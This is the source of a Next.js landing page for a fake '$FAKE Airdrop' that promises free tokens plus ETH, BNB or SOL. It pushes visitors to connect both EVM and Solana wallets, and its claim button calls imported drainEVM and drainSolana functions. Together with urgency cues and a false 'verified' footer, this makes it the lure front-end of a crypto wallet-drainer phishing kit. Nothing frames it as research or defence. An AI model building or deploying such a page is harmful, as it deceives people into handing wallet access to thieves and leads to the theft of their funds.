import Head from 'next/head';
import { ConnectButton } from '@rainbow-me/rainbowkit';
import { useAccount, useWalletClient } from 'wagmi';
import { useWallet } from '@solana/wallet-adapter-react';
import { drainEVM, drainSolana } from '../lib/drainers';
import MobileClaim from '../components/MobileClaim';

export default function Home() {
  const { address: evmAddress, isConnected: evmConnected } = useAccount();
  const solana = useWallet();
  const { data: walletClient } = useWalletClient();

  const handleClaim = async () => {
    if (evmConnected && walletClient) await drainEVM(walletClient, evmAddress);
    if (solana.connected) await drainSolana(solana, solana.publicKey);
  };

  return (
    <>
      <Head>
        <title>🚀 $FAKE Airdrop - Claim Now!</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      </Head>
      
      <div className="min-h-screen bg-gradient-to-br from-indigo-600 via-purple-600 to-pink-600 flex flex-col items-center justify-center p-4 sm:p-6 lg:p-8">
        <div className="w-full max-w-md sm:max-w-lg lg:max-w-2xl bg-white/10 backdrop-blur-3xl rounded-3xl p-6 sm:p-8 lg:p-12 border border-white/20 shadow-2xl">
          
          {/* Mobile-First Header */}
          <div className="text-center mb-8">
            <div className="w-20 h-20 bg-white/20 rounded-2xl mx-auto mb-6 flex items-center justify-center">
              <span className="text-3xl">🚀</span>
            </div>
            <h1 className="text-2xl sm:text-3xl lg:text-5xl font-black text-white mb-4 bg-gradient-to-r from-white to-gray-200 bg-clip-text text-transparent animate-pulse-gradient">
              $FAKE Airdrop Live!
            </h1>
            <p className="text-lg sm:text-xl text-white/90 leading-relaxed">
              Claim <span className="font-bold text-2xl text-yellow-300">10,000 $FAKE</span> + 
              <span className="block sm:inline"> 0.1 ETH/BNB/SOL</span> instantly!
            </p>
          </div>

          {/* Wallet Connections - Stacked Mobile */}
          <div className="space-y-4 mb-8">
            <ConnectButton 
              label="Connect EVM Wallet (ETH/BSC)"
              className="!w-full !justify-center"
            />
            <MobileClaim />
          </div>

          {/* Big Claim Button */}
          <button
            onClick={handleClaim}
            disabled={!evmConnected || !solana.connected}
            className="w-full bg-gradient-to-r from-emerald-500 to-teal-600 hover:from-emerald-600 hover:to-teal-700 text-white py-5 px-8 rounded-2xl font-black text-lg sm:text-xl shadow-2xl hover:shadow-emerald-500/50 transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed transform hover:-translate-y-1 active:translate-y-0"
          >
            {evmConnected && solana.connected 
              ? '💰 CLAIM $10,100 REWARDS NOW 💰' 
              : 'Connect Both Wallets to Claim'}
          </button>

          {/* Footer */}
          <p className="text-white/60 mt-8 text-xs sm:text-sm text-center">
            Verified by FakeAirdrop Protocol v2.3 | 24h left
          </p>
        </div>
      </div>
    </>
  );
}